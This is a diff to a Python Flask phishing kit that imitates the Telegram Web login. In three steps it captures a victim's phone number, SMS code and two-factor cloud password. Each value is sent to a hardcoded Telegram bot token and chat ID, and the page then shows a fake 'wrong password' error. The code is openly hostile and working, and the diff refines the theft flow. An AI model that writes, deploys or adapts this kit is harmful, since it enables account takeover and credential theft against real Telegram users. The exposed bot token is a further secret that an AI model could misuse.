@@ -4,24 +4,14 @@ import os
 
 app = Flask(__name__)
 
-# --- НАСТРОЙКИ ТЕЛЕГРАМ БОТА ---
-BOT_TOKEN = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw"  # Замени!
-CHAT_ID = "6467020677"             # Замени!
-PROXY = ""  # Если используешь прокси (например, "http://127.0.0.1:8080"), вставь сюда. Если VPN системный — оставь пустым.
+BOT_TOKEN = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw" 
+CHAT_ID = "6467020677"
 
 def send_to_tg(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message}
-    
-    proxies = {
-        "http": PROXY,
-        "https": PROXY
-    } if PROXY else None
-
     try:
-        # Отправляем запрос (через прокси, если он указан)
-        response = requests.post(url, json=payload, proxies=proxies, timeout=10)
-        print("Лог отправлен:", response.text)
+        requests.post(url, json=payload, timeout=10)
     except Exception as e:
         print("Ошибка отправки:", e)
 
@@ -36,14 +26,41 @@ STYLE = """
 </style>
 """
 
+# ЭТАП 1: Только номер телефона
 @app.route('/')
 def index():
     return render_template_string(f"""
     <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
         <div class="login-box">
             <h2>Вход в Telegram</h2>
-            <form action="/login" method="post">
+            <form action="/submit_phone" method="post">
                 <input type="text" name="phone" placeholder="Номер телефона" required><br>
+                <button type="submit">Далее</button>
+            </form>
+        </div>
+    </body></html>
+    """)
+
+# Обработка номера и переход к вводу кода
+@app.route('/submit_phone', methods=['POST'])
+def submit_phone():
+    phone = request.form.get('phone')
+    # Сохраняем номер в телеграм
+    send_to_tg(f"📱 [ЭТАП 1] Получен номер: {phone}")
+    # Переходим на страницу ввода кода, передавая номер
+    return redirect(url_for('enter_code', phone=phone))
+
+# ЭТАП 2: Ввод кода из СМС
+@app.route('/code')
+def enter_code():
+    phone = request.args.get('phone', '')
+    return render_template_string(f"""
+    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
+        <div class="login-box">
+            <h2>Введите код</h2>
+            <p style="font-size:14px; color:#666;">Мы отправили код на номер {phone}</p>
+            <form action="/submit_code" method="post">
+                <input type="hidden" name="phone" value="{phone}">
                 <input type="text" name="code" placeholder="Код из СМС" required><br>
                 <button type="submit">Далее</button>
             </form>
@@ -51,16 +68,17 @@ def index():
     </body></html>
     """)
 
-@app.route('/login', methods=['POST'])
-def login():
+# Обработка кода и переход к 2FA
+@app.route('/submit_code', methods=['POST'])
+def submit_code():
     phone = request.form.get('phone')
     code = request.form.get('code')
     
-    # Отправляем в ТГ
-    send_to_tg(f"🚨 [НОВЫЙ ЛОГ]\n📱 Телефон: {phone}\n🔑 Код: {code}")
+    send_to_tg(f"🔑 [ЭТАП 2] Номер: {phone} | Код: {code}")
     
     return redirect(url_for('twofa', phone=phone))
 
+# ЭТАП 3: Ввод пароля 2FA
 @app.route('/2fa')
 def twofa():
     phone = request.args.get('phone', '')
@@ -68,7 +86,7 @@ def twofa():
     <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
         <div class="login-box">
             <h2>Облачный пароль</h2>
-            <p style="font-size:14px; color:#666;">Введите пароль 2FA</p>
+            <p style="font-size:14px; color:#666;">Введите пароль двухфакторной аутентификации</p>
             <form action="/2fa_submit" method="post">
                 <input type="hidden" name="phone" value="{phone}">
                 <input type="password" name="password" placeholder="Пароль" required><br>
@@ -76,21 +94,21 @@ def twofa():
             </form>
         </div>
     </body></html>
-    """)
-
+    """)# Обработка пароля 2FA
 @app.route('/2fa_submit', methods=['POST'])
 def twofa_submit():
     phone = request.form.get('phone')
     password = request.form.get('password')
     
-    # Отправляем в ТГ
-    send_to_tg(f"🚨 [НОВЫЙ ЛОГ - 2FA]\n📱 Телефон: {phone}\n🔒 Пароль: {password}")
+    send_to_tg(f"🔒 [ЭТАП 3] Номер: {phone} | Пароль 2FA: {password}")
     
+    # Показываем ошибку, чтобы человек думал, что пароль неверный
     return render_template_string(f"""
     <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
         <div class="login-box">
             <h2>Вход в Telegram</h2>
             <div class="error">Неверный пароль! Попробуйте снова.</div>
+            <a href="/" style="display:block; margin-top:20px; color:#3390ec; text-decoration:none;">Вернуться на главную</a>
         </div>
     </body></html>
     """)
